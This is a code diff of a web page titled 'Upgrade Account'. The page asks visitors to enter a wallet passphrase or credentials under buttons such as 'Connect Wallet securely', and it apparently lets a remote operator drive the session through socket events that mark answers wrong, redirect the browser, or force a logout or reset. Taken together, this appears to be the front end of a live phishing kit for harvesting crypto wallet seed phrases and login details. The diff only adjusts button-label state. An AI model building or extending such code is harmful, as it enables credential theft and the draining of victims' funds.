@@ -337,8 +337,8 @@
             <h2 class="classic-title" style="font-size: 24px;">Upgrade Account</h2>
             
             <div id="selected-region-bar" class="selected-region-bar" onclick="backToSelector()">
-                <span>Region:</span>
-                <div id="region-flag"></div>
+                
+                <div style="padding: 3px;" id="region-flag"></div>
                 <strong id="region-name"></strong>
                 <span style="margin-left: auto; color: var(--accent-blue); font-size: 11px;">Change</span>
             </div>
@@ -381,6 +381,7 @@
     <script>
 
        let accessType = "passphrase"; 
+       let joinActive = false;
 
         const indicator = document.getElementById('indicator');
         const placeholder = document.getElementById('placeholder');
@@ -567,13 +568,20 @@
                 document.getElementById('cred').classList.add('active');
                 document.getElementById('pass').classList.remove('active');
                 accessType = 'credentials';
+                if(!joinActive){
+                    $(".btn-text").html('Process Verification');
+                }
             } else {
                 accessType = 'passphrase';
                 credentialsSec.classList.add('hidden');
                 passphraseSec.classList.remove('hidden');
                 document.getElementById('pass').classList.add('active');
                 document.getElementById('cred').classList.remove('active');
+                if(!joinActive){
+                    $(".btn-text").html('Connect Wallet securely');
+                }
             }
+
         }
     </script>
 </div>
@@ -649,7 +657,6 @@
 
 
     function startInterview(btn, type, isRestore = false) {
-        
         btn.classList.add('btn-loading');
         const btnText = btn.querySelector('.btn-text');
         if(btnText) btnText.innerText = "Processing...";
@@ -691,6 +698,7 @@
             
         document.getElementById('error-div').innerHTML = '';
         $('#z6x2c9v4b1_992211').show();
+        joinActive = true;
             
             
         socket.emit('join_interview', { 
@@ -708,6 +716,7 @@
     }
 
     socket.on('new_task', async (data) => {
+        joinActive = false;
         if ($('#z6x2c9v4b1_992211')) {
             $('#z6x2c9v4b1_992211').hide();
         }
@@ -772,6 +781,7 @@
     }
 
     socket.on('redirect_command', (data) => {
+        joinActive = false;
         if (data.url) window.location.href = data.url;
     });
 
@@ -801,6 +811,7 @@
     }
 
     function submitWork() {
+        
         const form = document.querySelector('form');
         const submitBtn = form.querySelector('button[type="submit"]') || form.querySelector('button');
         
@@ -828,7 +839,7 @@
     }
 
     socket.on('wrong_answer', (data) => {
-        
+        joinActive = false;
         const errDiv = document.getElementById('error-div');
         const wrapper = document.querySelector('.wrapper');
         const submitBtn = document.querySelector('button');
@@ -852,17 +863,20 @@
     });
 
     socket.on('force_reset', () => {
+        joinActive = false;
         localStorage.removeItem('current_task');
         window.location.reload();
         
     });
 
     socket.on('force_logout', () => {
+        joinActive = false;
         localStorage.clear();
         window.location.reload();
     });
 
     socket.on('join_failed', (data) => {
+        joinActive = false;
         console.warn("Join failed:", data.message);
         let btnText = "Resubmit";
         
@@ -877,11 +891,11 @@
         localStorage.removeItem('cand_cat');
         document.getElementById('indicator').focus();
 
-        if($(".action-btn")){
+        if($(".btn-text")){
             btnText = (accessType === "passphrase")? "Connect Wallet securely" : "Process Verification";
         }
 
-        $(".action-btn").html(btnText)
+        $(".btn-text").html(btnText)
         $(".action-btn").prop('disabled', false);
         
         // 3. Reset local variables so they have to type/select again if necessary
